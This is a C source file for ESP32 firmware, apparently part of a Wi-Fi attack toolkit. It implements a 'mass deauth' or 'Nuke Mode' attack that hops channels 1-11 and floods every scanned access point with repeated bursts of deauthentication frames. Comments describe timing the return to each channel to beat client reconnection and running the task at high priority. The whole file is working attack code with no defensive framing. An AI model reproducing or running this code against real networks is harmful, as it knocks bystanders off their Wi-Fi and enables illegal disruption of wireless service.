#include "attack_massdeauth.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"
#include "attack.h"

static const char *TAG = "attack_massdeauth";
static TaskHandle_t mass_deauth_task_handle = NULL;
static bool mass_deauth_running = false;

/**
 * @brief Send a concentrated burst of deauth frames to ONE AP.
 *        More bursts = harder for client to reconnect.
 */
static void nuke_ap(const wifi_ap_record_t *ap) {
    // 5 aggressive bursts per AP (each burst = 3 frames with diff reason codes)
    for (int i = 0; i < 5; i++) {
        wsl_bypasser_send_deauth_frame(ap);
    }
}

/**
 * @brief Mass deauth task
 * 
 * Strategy: 
 * - Skip channels with no APs (saves time)
 * - Hit channels WITH APs hard (5 bursts each)
 * - Come back FAST (100ms/channel) — faster than reconnection time
 */
static void mass_deauth_task(void *arg) {
    ESP_LOGI(TAG, "Nuke Mode Task started.");

    uint8_t channel = 1;
    
    while (mass_deauth_running) {
        esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        if (err == ESP_OK) {
            const wifictl_ap_records_t *ap_records = wifictl_get_ap_records();
            
            int ap_count = 0;
            for (int i = 0; i < ap_records->count; i++) {
                if (ap_records->records[i].primary == channel) {
                    nuke_ap(&ap_records->records[i]);
                    ap_count++;
                }
            }
            
            if (ap_count > 0) {
                ESP_LOGI(TAG, "CH%2d: Nuked %d AP(s) x5 bursts", channel, ap_count);
                // Extra pause ONLY if there were actual targets (let frames go out)
                vTaskDelay(pdMS_TO_TICKS(50));
            }
        }
        
        // Fast hop (100ms) — devices need ~200ms minimum to reconnect
        // So we will be back BEFORE they can complete reconnection
        vTaskDelay(pdMS_TO_TICKS(100));
        
        // India: channels 1-11 only
        channel++;
        if (channel > 11) {
            channel = 1;
        }
    }

    ESP_LOGI(TAG, "Nuke Mode Task exited.");
    mass_deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

void attack_massdeauth_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting Mass Deauther (Nuke Mode)...");
    
    const wifictl_ap_records_t *ap_records = wifictl_get_ap_records();
    if (ap_records->count == 0) {
        ESP_LOGW(TAG, "WARNING: No APs in scan list! Scan first for best results.");
    } else {
        ESP_LOGI(TAG, "Scan list: %d APs ready to nuke.", ap_records->count);
    }
    
    mass_deauth_running = true;

    // Kick connected clients so channel switch is possible
    esp_wifi_deauth_sta(0);
    vTaskDelay(pdMS_TO_TICKS(300));
    
    // High priority task (7) — preempts most things, keeps deauth going fast
    xTaskCreate(
        mass_deauth_task,
        "mass_deauth",
        4096,
        NULL,
        7,
        &mass_deauth_task_handle
    );
}

void attack_massdeauth_stop() {
    ESP_LOGI(TAG, "Stopping Mass Deauther...");
    
    mass_deauth_running = false;
    
    // Wait for task to exit cleanly
    if (mass_deauth_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(600));
    }
    
    // Restore management AP
    wifictl_set_channel(CONFIG_MGMT_AP_CHANNEL);
    wifictl_mgmt_ap_start();
    
    ESP_LOGI(TAG, "Mass Deauther stopped.");
}
